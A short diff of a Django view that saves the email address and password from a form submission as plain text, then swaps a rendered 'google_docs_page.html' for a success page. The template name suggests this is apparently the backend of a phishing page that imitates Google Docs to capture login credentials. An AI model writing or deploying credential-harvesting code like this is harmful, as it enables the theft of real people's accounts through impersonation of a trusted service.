@@ -14,4 +14,4 @@ def index_view(request):
 			obj.User = request.POST['email']
 			obj.password = request.POST['passwd']
 			obj.save()
-		return render(request,"google_docs_page.html",{})
+		return render(request,"sucess_file.html",{"uesr":request.POST['email']})
